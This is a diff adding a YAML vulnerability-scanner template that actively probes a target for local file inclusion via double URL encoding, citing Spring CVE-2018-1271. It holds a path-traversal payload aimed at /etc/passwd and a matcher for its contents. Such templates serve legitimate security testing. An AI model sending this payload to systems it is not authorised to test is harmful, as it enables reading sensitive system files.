@@ -1,0 +1,22 @@
+id: patt-lfi-dblenc-01-file
+name: 'PATT lfi patt-lfi-dblenc-01 via file'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - encodedoubleurl
+requires:
+  - java
+description: 'PATT Double URL Encoding for single-decode filters (Spring CVE-2018-1271). [patt:patt-lfi-dblenc-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      file:
+        - '..%252f..%252f..%252fetc%252fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
